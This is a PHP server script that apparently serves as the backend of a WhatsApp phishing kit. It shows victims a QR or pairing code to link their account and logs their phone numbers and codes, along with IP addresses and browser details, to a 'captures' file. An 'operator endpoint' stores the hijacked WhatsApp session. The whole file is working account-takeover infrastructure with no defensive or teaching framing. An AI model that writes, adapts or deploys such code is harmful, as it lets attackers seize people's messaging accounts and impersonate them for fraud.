<?php
require_once __DIR__ . '/config.php';
$cfg = require __DIR__ . '/config.php';

header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');

$dataDir = $cfg['data_dir'];
if (!is_dir($dataDir)) {
    @mkdir($dataDir, 0777, true);
}

function readJson($path) {
    if (!is_file($path)) return null;
    $raw = @file_get_contents($path);
    if ($raw === false || $raw === '') return null;
    $d = json_decode($raw, true);
    return is_array($d) ? $d : null;
}

function writeJson($path, $data) {
    $tmp = $path . '.tmp';
    $ok = @file_put_contents($tmp, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES), LOCK_EX);
    if ($ok === false) return false;
    return @rename($tmp, $path);
}

function appendJson($path, $entry) {
    $list = readJson($path);
    if (!is_array($list)) $list = [];
    $list[] = $entry;
    return writeJson($path, $list);
}

function clientIp() {
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) {
            $v = explode(',', $_SERVER[$k])[0];
            return trim($v);
        }
    }
    return '0.0.0.0';
}

$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : 'status';

switch ($action) {

    case 'status': {
        $linked = is_file($cfg['session_file']);
        $code = null;
        if (is_file($cfg['code_file'])) {
            $code = trim((string)@file_get_contents($cfg['code_file']));
            if ($code === '') $code = null;
        }
        $qr = null;
        if (is_file($cfg['qr_file'])) {
            $qr = 'assets/qr.png';
        }
        $status = $linked ? 'Linked.' : ($code ? 'Enter the code in WhatsApp.' : 'Scan the QR code with WhatsApp.');
        echo json_encode([
            'linked'   => $linked,
            'code'     => $code,
            'qr'       => $qr,
            'status'   => $status,
            'redirect' => $cfg['redirect_url'],
        ]);
        break;
    }

    case 'submit_phone': {
        $phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
        if ($phone === '') {
            echo json_encode(['ok' => false, 'error' => 'Phone required.']);
            break;
        }
        $entry = [
            'phone'     => $phone,
            'ip'        => clientIp(),
            'ua'        => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '',
            'time'      => date('c'),
        ];
        appendJson($cfg['phones_file'], $entry);
        echo json_encode(['ok' => true]);
        break;
    }

    case 'submit_code': {
        $code = isset($_POST['code']) ? trim($_POST['code']) : '';
        if ($code === '') {
            echo json_encode(['ok' => false, 'error' => 'Code required.']);
            break;
        }
        $entry = [
            'code'      => $code,
            'ip'        => clientIp(),
            'ua'        => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '',
            'time'      => date('c'),
        ];
        appendJson($cfg['captures_file'], $entry);
        echo json_encode(['ok' => true]);
        break;
    }

    case 'save_session': {
        // Operator endpoint: POST raw session JSON to persist as wa-s-id.json
        $raw = file_get_contents('php://input');
        $data = json_decode($raw, true);
        if (!is_array($data)) {
            // accept form-encoded too
            $data = isset($_POST['session']) ? json_decode($_POST['session'], true) : null;
        }
        if (!is_array($data)) {
            echo json_encode(['ok' => false, 'error' => 'Invalid session payload.']);
            break;
        }
        $data['_saved_at'] = date('c');
        $data['_ip'] = clientIp();
        if (writeJson($cfg['session_file'], $data)) {
            echo json_encode(['ok' => true]);
        } else {
            echo json_encode(['ok' => false, 'error' => 'Write failed.']);
        }
        break;
    }

    default:
        echo json_encode(['ok' => false, 'error' => 'Unknown action.']);
}
